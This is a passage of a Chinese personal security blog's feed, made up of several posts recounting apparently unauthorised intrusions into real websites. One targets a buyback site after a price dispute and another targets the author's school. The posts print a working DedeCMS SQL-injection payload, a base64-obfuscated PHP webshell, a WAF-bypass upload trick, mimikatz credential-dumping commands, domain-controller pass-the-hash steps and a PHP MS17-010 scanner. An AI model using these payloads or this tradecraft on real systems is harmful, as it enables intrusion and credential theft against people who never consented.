MsMpEng.exe杀软</span><br></pre></td></tr></table></figure><p>这样子就确定了站库分离结构，<code>x.100</code>网站 <code>x.101</code>数据库，难怪之前连接错误，然后远程链接<code>x.101</code><br><img src="/images/某站点的简单测试/11.PNG" alt=""></p><h2 id="简单的内网渗透"><a href="#简单的内网渗透" class="headerlink" title="简单的内网渗透"></a>简单的内网渗透</h2><p>反弹个<code>cs</code>会话<br><img src="/images/某站点的简单测试/12.PNG" alt=""><br>dump管理员<code>hash</code><br><img src="/images/某站点的简单测试/13.PNG" alt=""><br>代理访问内网，用<code>msf</code>里的模块，扫描内网信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure></p><p><img src="/images/某站点的简单测试/14.PNG" alt=""><br>Ok 发现域，扫描该IP(x.222)也存在445的洞，于是用445的payload反弹个<code>cs</code>会话回来<br><img src="/images/某站点的简单测试/15.PNG" alt=""><br>收集该机子的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo --&gt;Windows Serverr 2012 Standard x64</span><br><span class="line">所在域:AD</span><br><span class="line">ipconfig --&gt;x.222（公网）</span><br><span class="line">tasklist --&gt;无杀软</span><br></pre></td></tr></table></figure></p><p>既然在域里边，那就找找域管，找找域控<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group #查看组</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查看域控</span><br></pre></td></tr></table></figure></p><p>运气还不错，x.222这台就是域控机<br><img src="/images/某站点的简单测试/16.PNG" alt=""><br><img src="/images/某站点的简单测试/17.PNG" alt=""><br>查看目录中的机器名:dsquery computer<br><img src="/images/某站点的简单测试/18.PNG" alt=""><br>一共四台机子，既然拿到了域控，就dump哈希然后<code>hash注入</code>，让其余的机子上线<code>cs</code><br><img src="/images/某站点的简单测试/19.PNG" alt=""><br>OK，整个过程到此结束，擦屁股走人~至于内网的深度这里就不再研究了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;要做有纯粹的事。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>记一次渗透测试</title>
    <link href="OneHone.github.io/2018/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>OneHone.github.io/2018/07/11/记一次渗透测试/</id>
    <published>2018-07-11T09:01:59.000Z</published>
    <updated>2018-07-12T03:10:05.790Z</updated>
    
    <content type="html"><![CDATA[<p>湖人总冠军！<br><a id="more"></a></p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近手里有瓶茅台酒，打算拿出去卖，于是上网搜高价回收烟酒，加了个卖家，聊了几句，发现对方态度不咋滴，收购价也低（后来知道这货比同行收购价少了四百块）。本着正义，对该网站进行了测试。<br>目标：<code>www.a.com</code></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口:80</span><br><span class="line">旁站：www.b.com www.c.com(实际中还有三个旁站，但没啥利用，就不写了)</span><br><span class="line">通过页面报错可知：iis7.5+win08</span><br></pre></td></tr></table></figure><h3 id="怼"><a href="#怼" class="headerlink" title="怼"></a>怼</h3><p>对a.com进行了测试，并未发现web层面上的漏洞，于是转向旁站。<br>对旁站b.com测试发现，该网站采用了<code>phpwebCMS</code>， 该cms的某些版本存在万能钥匙<br><img src="/images/记一次渗透测试/1.PNG" alt=""><br>想进后台？不存在的。第二个突破点是该后台还可以用burp爆破，页面不刷新验证码就不会变，挂了top1000的字典没跑出来，爆破看人品~。<br>接下来对c.com测试，输入<code>robots.txt</code><br><img src="/images/记一次渗透测试/2.PNG" alt=""><br>熟悉不过了，dedecms，输入/dede，跳到管理后台<br><img src="/images/记一次渗透测试/3.PNG" alt=""><br>版本：<code>Dedev57</code> 想到之前有段代码能把管理员的账号密码给爆出来，于是试了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\&apos; or mid=@`\&apos;` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+`#@__admin` limit+0,1),5,6,7,8,9#@`\&apos;`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294</span><br></pre></td></tr></table></figure></p><p>结果被waf拦了<br><img src="/images/记一次渗透测试/4.PNG" alt=""><br>没办法，回到dede后台，尝试弱口令无果之后，就结合域名猜，猜了好久，记得当时是晚上十一点多，已经到了撩螺的时间，心想再试最后一分钟，没想到还真试出来了，密码：域名+0000<br><img src="/images/记一次渗透测试/5.PNG" alt=""><br>皮~，通过文件管理器将马子传上去，结果又被waf拦了<br><img src="/images/记一次渗透测试/6.PNG" alt=""><br>好吧，放弃撩螺时间，怼。<br>传php内容为一句话，杀<br>传php内容为1，杀<br>传txt内容为一句话，不杀<br>Dede有文件改名功能，所以把一句话写入txt，将txt改名为php即可绕过waf(尴尬)<br><img src="/images/记一次渗透测试/7.PNG" alt=""><br>上刀！<br><img src="/images/记一次渗透测试/8.PNG" alt=""><br>不想被查水表，所以打码狠点</p><h2 id="有点意思"><a href="#有点意思" class="headerlink" title="有点意思"></a>有点意思</h2><p>菜刀执行cmd：<br><img src="/images/记一次渗透测试/9.PNG" alt=""><br>发现报错，响应也看不懂<br>本站支持的脚本为：php，asp，针对该环境整理一下提权思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找个可写可读目录，上传cmd.txt，执行命令（这里运行之后提示缺少对象或者文件未找到（路径是对的），当时没截图，就不打算写了）</span><br><span class="line">通过php进行提权，看是否能绕过disabled_function，进行命令执行。第二生成msf的php马，进行命令执行</span><br><span class="line">通过asp进行提权，用asp的cmd马执行命令。第二生成msf的asp马，进行命令执行</span><br><span class="line">通过mysql进行提权，读取配置文件，找root密码，进行udf，mof提权</span><br><span class="line">代理出来，通过ms17-010</span><br></pre></td></tr></table></figure></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>首先通过<code>phpinfo</code>查看禁止了哪些函数以及是否为安全模式<br><img src="/images/记一次渗透测试/10.PNG" alt=""><br><img src="/images/记一次渗透测试/11.PNG" alt=""><br>安全模式为off，没有禁掉exec_shell，可以用该函数执行命令<br><img src="/images/记一次渗透测试/12.PNG" alt=""><br>报错？难道姿势不对？那换种姿势看看<br><img src="/images/记一次渗透测试/13.PNG" alt=""><br>一脸懵逼？？什么情况？？那试试proc_open函数看看<br><img src="/images/记一次渗透测试/14.PNG" alt=""><br>也不行，创建进程失败，这时候想到了另外一种方法，那就是调用com组件会不会成功？这里用了t00ls分享的技巧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$l=&apos;baSe6&apos;;</span><br><span class="line">$o=&apos;4_dE&apos;;</span><br><span class="line">$v=&apos;cO&apos;;</span><br><span class="line">$e=&apos;DE&apos;;</span><br><span class="line">$love=$l.$o.$v.$e;</span><br><span class="line">$a=$love(&apos;JHBocHdzaD1uZXcgQ09NKCJXc2NyaXB0LlNoZWxsIikgb3IgZGllKCJDcmVhdGUgV3NjcmlwdC5TaGVsbCBGYWlsZWQhIik7ICAKJGV4ZWM9JHBocHdzaC0+ZXhlYygiY21kLmV4ZSAvYyAiLiRfUE9TVFsnYyddLiIiKTsgIAokc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOyAgCiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7ICAKZWNobyAkc3Ryb3V0cHV0OyA=&apos;);</span><br><span class="line">eval($a=$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在本地测试没问题，一丢到目标机子运行就报错：wscript.shell拒绝访问<br><img src="/images/记一次渗透测试/15.PNG" alt=""><br>啊！<br>换了各种大马也没见奇效！皮有点硬啊！<br>最后试一下反弹个msf的<code>shell</code>回来看看能不能执行命令和执行<code>exe</code><br><img src="/images/记一次渗透测试/16.PNG" alt=""><br>进程列不出，<code>shell</code>也进不去。尝试运行<code>exe</code><br><img src="/images/记一次渗透测试/17.PNG" alt=""><br>也不行，皮。</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>接下来试试<code>asp</code>能不能执行命令，首先上传cmd马运行，结果报错：Server.CreateObject调用失败，对象访问被拒绝。<br><img src="/images/记一次渗透测试/18.PNG" alt=""><br>我记得asp执行系统命令都会调用这函数的吧？之后也是换各种asp大马，cmd马都不行，提示缺少对象，调用<code>Shell.application</code>组件也不行。不支持<code>aspx</code><br>同样试一下<code>asp</code>的<code>msf</code>马，结果。。。<br><img src="/images/记一次渗透测试/19.PNG" alt=""></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>其次就是翻各种配置文件了，因为没权限，目录卡的很死，只能看dedeCMS目录结构下的文件，理所当然的只能读到<code>mysql</code>低权限的<code>dede</code>用户，在<code>common.inc.php</code>读取数据账号密码<br>这里用到的是低用户读取<code>user.MYD</code>文件，从而读到<code>root</code>密码，用低用户链接数据，执行<code>select @@datadir;</code>查询读取数据库路径<br><img src="/images/记一次渗透测试/20.PNG" alt=""><br>所以<code>user.MYD</code>为<code>D:\mysql\Data\mysql\user.MYD</code><br>接下来开始读取<code>root</code>密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table `a` ( `content` LONGTEXT );</span><br><span class="line">LOAD DATA LOCAL INFILE &apos;D:\\mysql\\Data\\mysql\\user.MYD&apos; INTO TABLE `a` fields terminated by &apos;&apos; LINES TERMINATED BY &apos;\0&apos;;</span><br><span class="line">select `content` from `a`;</span><br></pre></td></tr></table></figure></p><p><img src="/images/记一次渗透测试/21.PNG" alt=""><br>找不到user表？太炸了，讲真最惨的时候也只是读不出完整root密码而已，炸了炸了。这里有个问题，用户能链接到数据库，那肯定有个表存放着账号。我认为目标可能把user表给改名了，可又没有方法验证是不是这样。一般人也不会改这东西啊，奇怪了。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>通过<code>reGeorg</code>代理，打445端口，结果也凉了，就不截图了</p><h2 id="怼不过"><a href="#怼不过" class="headerlink" title="怼不过"></a>怼不过</h2><p>目前并没有好的方法（有什么好技巧，可以私聊我），看看以后能不能找到某种方式执行命令，可以的话就写个提权文章补上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;湖人总冠军！&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透自己的母校</title>
    <link href="OneHone.github.io/2018/06/12/%E6%B8%97%E9%80%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%AF%8D%E6%A0%A1/"/>
    <id>OneHone.github.io/2018/06/12/渗透自己的母校/</id>
    <published>2018-06-12T06:01:49.000Z</published>
    <updated>2018-06-13T01:57:08.391Z</updated>
    
    <content type="html"><![CDATA[<p>起初的梦想都是黑掉自己的学校吧。<br><a id="more"></a><br>正如上面所说，一直想再一次拿到学校的shell，但最近在忙于别的事情，始终没有好的时间静下心来渗透自己的母校，这几天抽空完成了一图角，顺便写个实录。</p><h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>结合主站、C段、旁站、二级域名和端口的思路一顿乱操作发现了一处后台管理登入框存在弱口令<br><img src="/images/渗透自己的母校/1.PNG" alt=""><br>后台没有备份功能，接下来找上传点把<code>shell</code>传上去<br><img src="/images/渗透自己的母校/2.PNG" alt=""><br>后台没有多的上传点，唯独只有<code>KindEditor</code>编辑器上传功能，看到版本号已经凉了，这编辑器高版本简直无敌，之前遇到好几个都没拿下来，但这次不一样，我甚至没有过多的操作，看到版本号就溜了~</p><h2 id="中"><a href="#中" class="headerlink" title="中"></a>中</h2><p>后台没有成功拿到<code>shell</code>后又忙了几天，今天无意在浏览器的标签页看到了这网站，于是又重新审视了一番，扫描端口发现了该<code>IP</code>开了挺多的<code>web服务</code>，其中有<code>apache+tomcat</code> <code>nginx</code> <code>apache+php</code>逐个访问端口，没有发现<code>web</code>层面上的漏洞，之后在xxx端口访问到一处登入框<br><img src="/images/渗透自己的母校/3.PNG" alt=""><br>尝试弱口令无果，难道非要我祭出100w+的字典爆破！？<br>在验证账密密码过后，<code>url</code>变成了<code>http://www.xxx.xxx/login.action</code><br><img src="/images/渗透自己的母校/4.PNG" alt=""><br>记得在学校的时候老师讲<code>struts2</code>可厉害了，怪我是个差学生，不好好听课。<br>言归正传，<code>xxx.action、xxx.do</code>这些后缀是典型的<code>struts2</code>框架啊，立马用脚本验证了下，果真存在漏洞。<br><img src="/images/渗透自己的母校/5.PNG" alt=""><br>执行命令，收集目标机的情况<br><img src="/images/渗透自己的母校/6.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami --&gt;system权限</span><br><span class="line">ipconfig --&gt;公网IP</span><br><span class="line">tasklist --&gt;无杀软无狗（惊了）</span><br><span class="line">3389 --&gt;开</span><br></pre></td></tr></table></figure></p><p>上cs<br><img src="/images/渗透自己的母校/7.PNG" alt=""><br>加载<code>mimikatz</code>获取明文<br><img src="/images/渗透自己的母校/8.PNG" alt=""><br>上传一句话<br><img src="/images/渗透自己的母校/9.PNG" alt=""><br>页面报错，没关系，直接用菜刀链<br><img src="/images/渗透自己的母校/10.PNG" alt=""><br>菜刀报错，没关系，换把刀<br><img src="/images/渗透自己的母校/11.PNG" alt=""><br>OK 继续下去，还没完，远程登入进去<br><img src="/images/渗透自己的母校/12.PNG" alt=""><br>数据库<br><img src="/images/渗透自己的母校/13.PNG" alt=""><br>打算往内网走，但内网没别的机器。<br><img src="/images/渗透自己的母校/14.PNG" alt=""></p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>后续<br><img src="/images/渗透自己的母校/15.PNG" alt=""><br>呵</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;起初的梦想都是黑掉自己的学校吧。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web渗透" scheme="OneHone.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP版ms17-010</title>
    <link href="OneHone.github.io/2018/05/28/PHP%E7%89%88ms17-010/"/>
    <id>OneHone.github.io/2018/05/28/PHP版ms17-010/</id>
    <published>2018-05-28T12:09:57.000Z</published>
    <updated>2018-05-28T12:24:02.215Z</updated>
    
    <content type="html"><![CDATA[<p>这么晚了，还没回家。<br><a id="more"></a><br>内网渗透扫描<code>ms17-010</code>脚本，比较方便快捷，无需其他插件。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//根据巡风python代码翻译成PHP代码</span><br><span class="line">//2017.08.03 by ice &amp;&amp; By T00ls.Net；</span><br><span class="line">@error_reporting(7);</span><br><span class="line">if(@$_GET[&apos;host&apos;])&#123;</span><br><span class="line">        $host=trim($_GET[&apos;host&apos;]);</span><br><span class="line">        if(ms17010($host,445))&#123;</span><br><span class="line">                echo &apos;&lt;span style=&quot;color:#F00&quot;&gt;[+] Vulnerability!&lt;/span&gt;&apos;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                echo &apos;&lt;span style=&quot;color:#000&quot;&gt;[-] No Vulnerability!&lt;/span&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &apos;&lt;br&gt;[+] OS: &lt;span style=&quot;color:#666&quot;&gt;&apos;.smbos($host,445).&quot;&lt;/span&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function get_tree_connect_request($ip,$tree_id)&#123;</span><br><span class="line">        $ipc=&apos;005c5c&apos;.bin2hex($ip).&apos;5c49504324003f3f3f3f3f00&apos;;</span><br><span class="line">        $ipc_len_hex=bin2hex(pack(&apos;s&apos;,strlen($ipc)/2));</span><br><span class="line">        $data=&apos;ff534d4275000000001801280000000000000000000000000000729c&apos;.$tree_id.&apos;c4e104ff00000000000100&apos;.$ipc_len_hex.$ipc;</span><br><span class="line">        $tree=&apos;000000&apos;.bin2hex(pack(&apos;s&apos;,strlen($data)/2)).$data;</span><br><span class="line">        $data5=pack(&apos;H*&apos;,$tree);</span><br><span class="line">        return $data5;</span><br><span class="line">&#125;</span><br><span class="line">function ms17010($host,$port)&#123;</span><br><span class="line">        $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port;</span><br><span class="line">        $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT);</span><br><span class="line">        if ($sock)&#123;</span><br><span class="line">                $data1=pack(&apos;H*&apos;,&apos;00000054ff534d4272000000001801280000000000000000000000000000729c0000c4e1003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200&apos;);</span><br><span class="line">                fwrite($sock,$data1);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $data2=pack(&apos;H*&apos;,&apos;0000008fff534d4273000000001801280000000000000000000000000000729c0000c4e10cff000000dfff0200010000000000310000000000d400008054004e544c4d5353500001000000050208a2010001002000000010001000210000002e3431426c7441314e505974624955473057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data2);</span><br><span class="line">                $data2_data=fread($sock, 1024);</span><br><span class="line">                $user_id=substr(bin2hex($data2_data),64,4);</span><br><span class="line">                $data3=pack(&apos;H*&apos;,&apos;00000150ff534d4273000000001801280000000000000000000000000000729c&apos;.$user_id.&apos;c4e10cff000000dfff0200010000000000f200000000005cd0008015014e544c4d53535000030000001800180040000000780078005800000002000200d000000000000000d200000020002000d200000000000000f2000000050208a2ec893eacfc70bba9afefe94ef78908d37597e0202fd6177c0dfa65ed233b731faf86b02110137dc50101000000000000004724eed7b8d2017597e0202fd6177c0000000002000a0056004b002d005000430001000a0056004b002d005000430004000a0056004b002d005000430003000a0056004b002d00500043000700080036494bf1d7b8d20100000000000000002e003400310042006c007400410031004e005000590074006200490055004700300057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data3);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $data4=pack(&apos;H*&apos;,&apos;00000063ff534d4273000000001801200000000000000000000000000000729c0000c4e10dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;);</span><br><span class="line">                fwrite($sock,$data4);</span><br><span class="line">                $data4_data=fread($sock, 1024);</span><br><span class="line">                $newuser_id=substr(bin2hex($data4_data),64,4);</span><br><span class="line">                $data5=get_tree_connect_request($host,$newuser_id);</span><br><span class="line">                fwrite($sock,$data5);</span><br><span class="line">                fread($sock, 1024);</span><br><span class="line">                $poc=pack(&apos;H*&apos;,&apos;0000004aff534d422500000000180128000000000000000000000000&apos;.$user_id.&apos;729c&apos;.$newuser_id.&apos;c4e11000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00&apos;);</span><br><span class="line">                fwrite($sock,$poc);</span><br><span class="line">                $poc_data=fread($sock, 1024);</span><br><span class="line">                if(substr(bin2hex($poc_data),18,8) == &apos;050200c0&apos;)&#123;</span><br><span class="line">                        return true;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                        return false;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">function smbos($host,$port)&#123;</span><br><span class="line">        $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port;</span><br><span class="line">        $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT);</span><br><span class="line">        if ($sock)&#123;</span><br><span class="line">                $payload1=pack(&apos;H*&apos;,&apos;00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;);</span><br><span class="line">                $payload2=pack(&apos;H*&apos;,&apos;0000010aff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a2000000000000000000000000000000000502ce0e0000000f00570069006e0064006f0077007300200053006500720076006500720020003200300030003300200033003700390030002000530065007200760069006300650020005000610063006b002000320000000000570069006e0064006f0077007300200053006500720076006500720020003200300030003300200035002e00320000000000&apos;);</span><br><span class="line">                fwrite($sock,$payload1);</span><br><span class="line">                $out1=fread($sock, 1024);</span><br><span class="line">                fwrite($sock,$payload2);</span><br><span class="line">                $out2=fread($sock, 1024);</span><br><span class="line">                $blob_len_arr=unpack(&apos;s&apos;,substr($out2,36+7,2));</span><br><span class="line">                $osarr=explode(chr(0),iconv(&apos;UTF-16LE&apos;,&apos;UTF-8&apos;,substr($out2,36+11+$blob_len_arr[1])));</span><br><span class="line">                return $osarr[0].&apos;|&apos;.$osarr[1];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx/ms17-010.php?host=IP</span><br></pre></td></tr></table></figure><p><img src="/images/PHP版ms17-010/1.PNG" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这么晚了，还没回家。&lt;br&gt;
    
    </summary>
    
      <category term="系统漏洞" scheme="OneHone.github.io/categories/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ms17-010" scheme="OneHone.github.io/tags/ms17-010/"/>
    
  </entry>
  
  <entry>
    <title>读取lsass.dmp报错</title>
    <link href="OneHone.github.io/2018/05/23/%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99/"/>
    <id>OneHone.github.io/2018/05/23/读取lsass-dmp文件报错/</id>
    <published>2018-05-23T06:06:20.000Z</published>
    <updated>2018-05-24T03:34:59.651Z</updated>
    
    <content type="html"><![CDATA[<p>最近抓系统hash的时候，遇到了些问题。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标机：windows 2003 X86</span><br></pre></td></tr></table></figure></p><h2 id="破解lsass-dmp"><a href="#破解lsass-dmp" class="headerlink" title="破解lsass.dmp"></a>破解lsass.dmp</h2><p>首先利用<code>procdump获取到lsass.dmp</code>，运用<code>mimikatz.exe</code>解密该文件。注：32位就用32位的<code>mimikatz</code>破，同理64位的也是。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p><p>结果发现报错：<br><img src="/images/读取lsass-dmp文件报错/1.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;MajorVersion (5) != MIMIKATZ_NT_MAJOR_VERSION (6)</span><br></pre></td></tr></table></figure></p><p>查阅网上资料，原来破解lsass.dmp文件是需要系统内核版本一一对应的。比如在<code>win03</code>系统上获取到<code>lsass.dmp</code>文件要在<code>win03</code>下运行<code>mimikatz</code>破解，当然了在<code>xp</code>下运行<code>mimikatz</code>破解也是可以的，只要内核版本一样就行。<br><img src="/images/读取lsass-dmp文件报错/2.PNG" alt=""></p><p>于是换了台机器成功破解<code>lsass.dmp</code><br><img src="/images/读取lsass-dmp文件报错/3.PNG" alt=""><br>抓系统hash不限于该方法，从注册表里导出hash也是不错的选择。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近抓系统hash的时候，遇到了些问题。&lt;br&gt;
    
    </summary>
    
      <category term="hash" scheme="OneHone.github.io/categories/hash/"/>
    
    
      <category term="hash" scheme="OneHone.github.io/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title> net view命令 6118报错 </title>
    <link href="OneHone.github.io/2018/05/15/net%20view%E5%91%BD%E4%BB%A4%206118%E6%8A%A5%E9%94%99/"/>
    <id>OneHone.github.io/2018/05/15/net view命令 6118报错/</id>
    <published>2018-05-15T02:10:18.000Z</published>
    <updated>2018-05-15T06:40:31.368Z</updated>
    
    <content type="html"><![CDATA[<p>小记<br><a id="more"></a><br>在一次测试中执行了<code>net view /domain</code>命令发现报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System error 6118 has occurred.</span><br><span class="line">The list of servers for this workgroup is not currently available</span><br></pre></td></tr></table></figure></p><p><img src="/images/net view命令 6118报错/1.PNG" alt=""></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>开启<code>Browser</code>服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Browser config start=aoto</span><br><span class="line">sc start Browser</span><br></pre></td></tr></table></figure></p><p>执行完可能需要等几分钟才能执行<code>net view</code>命令</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小记&lt;br&gt;
    
    </summary>
    
      <category term="系统命令" scheme="OneHone.github.io/categories/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="系统命令" scheme="OneHone.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案-3</title>
    <link href="OneHone.github.io/2018/04/12/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-3/"/>
    <id>OneHone.github.io/2018/04/12/Weblogic引发的血案-3/</id>
    <published>2018-04-12T07:55:48.000Z</published>
    <updated>2018-04-13T03:22:34.458Z</updated>
    
